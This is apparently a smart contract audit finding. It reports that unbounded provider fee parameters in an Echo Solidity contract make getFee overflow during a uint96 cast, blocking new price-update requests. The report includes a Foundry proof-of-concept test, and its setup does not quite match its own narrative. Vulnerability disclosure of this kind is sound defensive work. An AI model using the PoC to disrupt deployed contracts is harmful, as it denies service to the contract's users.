### Title
Unbounded Provider Fee Parameters Cause Permanent `getFee` Overflow DoS — (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

The `Echo` contract allows any address to register as a provider and set fee parameters (`feePerGasInWei`, `feePerFeedInWei`, `baseFeeInWei`) with no upper-bound validation. When a provider sets `feePerGasInWei` or `feePerFeedInWei` to a sufficiently large value, the `getFee` function permanently reverts via `SafeCast.toUint96` overflow. Because `requestPriceUpdatesWithCallback` calls `getFee` internally, all new requests to that provider are permanently blocked.

---

### Finding Description

`registerProvider` and `setProviderFee` accept `uint96` fee parameters with no application-level upper bound:

```solidity
function registerProvider(
    uint96 baseFeeInWei,
    uint96 feePerFeedInWei,
    uint96 feePerGasInWei
) external override {
    ProviderInfo storage provider = _state.providers[msg.sender];
    require(!provider.isRegistered, "Provider already registered");
    provider.baseFeeInWei = baseFeeInWei;
    provider.feePerFeedInWei = feePerFeedInWei;
    provider.feePerGasInWei = feePerGasInWei;
    provider.isRegistered = true;
    ...
}
``` [1](#0-0) 

`getFee` computes the gas fee as a `uint256` multiplication and then narrows it back to `uint96` via `SafeCast.toUint96`:

```solidity
uint256 gasFee = callbackGasLimit * providerFeeInWei; // uint32 * uint96 → uint256
feeAmount =
    baseFee +
    providerBaseFee +
    providerFeedFee +
    SafeCast.toUint96(gasFee); // REVERTS if gasFee > type(uint96).max
``` [2](#0-1) 

If a provider sets `feePerGasInWei` such that `callbackGasLimit × feePerGasInWei > type(uint96).max` (e.g., `feePerGasInWei = type(uint96).max` with any non-zero `callbackGasLimit`), `SafeCast.toUint96` reverts. The same overflow applies to `priceIds.length × feePerFeedInWei` when `feePerFeedInWei` is near `type(uint96).max / MAX_PRICE_IDS`.

Because `requestPriceUpdatesWithCallback` calls `getFee` unconditionally before storing any state:

```solidity
uint96 requiredFee = getFee(provider, callbackGasLimit, priceIds);
if (msg.value < requiredFee) revert InsufficientFee();
``` [3](#0-2) 

every new request to that provider permanently reverts. The provider's state is not reset; the overflow condition persists until the provider calls `setProviderFee` with a sane value.

The same structural gap exists in `setProviderFee`, which also accepts unbounded `uint96` values and can be called by the provider or their fee manager at any time after registration: [4](#0-3) 

The `ProviderInfo` struct confirms all three fee fields are raw `uint96` with no enforced ceiling: [5](#0-4) 

---

### Impact Explanation

A provider who sets `feePerGasInWei = type(uint96).max` causes `getFee` to revert for every call with a non-zero `callbackGasLimit`. Since `requestPriceUpdatesWithCallback` always passes a user-supplied `callbackGasLimit`, no new requests can be created for that provider. If the affected provider is the contract's `defaultProvider` (set at initialization by admin), the entire Echo contract becomes unusable for all users relying on the default. Existing in-flight requests are unaffected, but no new ones can be submitted.

---

### Likelihood Explanation

Any address can call `registerProvider` without permission. A provider who is later designated as `defaultProvider` by the admin can subsequently call `setProviderFee` with extreme values, retroactively breaking all default-provider requests. The attack requires no special key or governance majority — only a registered provider address. The Entropy contract's own test suite acknowledges the analogous overflow in `getFee` when `feeInWei = MAX_UINT128`: [6](#0-5) 

No equivalent guard or test exists in Echo.

---

### Recommendation

Add an application-level upper bound in both `registerProvider` and `setProviderFee`. For example:

```solidity
uint96 constant MAX_FEE_PER_GAS = 1e12; // 1 µETH per gas unit
uint96 constant MAX_FEE_PER_FEED = 1e18; // 1 ETH per feed
uint96 constant MAX_BASE_FEE    = 1e18; // 1 ETH base fee

require(feePerGasInWei  <= MAX_FEE_PER_GAS,  "feePerGasInWei too large");
require(feePerFeedInWei <= MAX_FEE_PER_FEED, "feePerFeedInWei too large");
require(baseFeeInWei    <= MAX_BASE_FEE,     "baseFeeInWei too large");
```

Alternatively, replace the `SafeCast.toUint96` narrowing in `getFee` with a checked multiplication that reverts with a descriptive error rather than a generic cast failure, and document the maximum safe fee values.

### Proof of Concept

```solidity
// SPDX-License-Identifier: Apache 2
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/echo/EchoUpgradeable.sol";

contract EchoFeeOverflowPoC is Test {
    EchoUpgradeable echo;
    address attacker = address(0xBEEF);
    address admin    = address(0xAD);
    address pyth     = address(0xCC);

    function setUp() public {
        EchoUpgradeable impl = new EchoUpgradeable();
        // deploy proxy, initialize with attacker as defaultProvider
        // (admin sets attacker as default after registration)
        echo = EchoUpgradeable(address(impl));
        echo.initialize(address(this), admin, 0, pyth, attacker, false, 30);
    }

    function testFeeOverflowDoS() public {
        // Step 1: attacker registers with type(uint96).max feePerGasInWei
        vm.prank(attacker);
        echo.registerProvider(0, 0, type(uint96).max);

        bytes32[] memory priceIds = new bytes32[](1);
        priceIds[0] = bytes32(uint256(1));

        // Step 2: getFee reverts for any non-zero callbackGasLimit
        vm.expectRevert(); // SafeCast overflow
        echo.getFee(attacker, 1_000_000, priceIds);

        // Step 3: requestPriceUpdatesWithCallback is permanently DoS'd
        vm.deal(address(this), 100 ether);
        vm.expectRevert();
        echo.requestPriceUpdatesWithCallback{value: 1 ether}(
            attacker,
            block.timestamp,
            priceIds,
            1_000_000
        );
    }
}
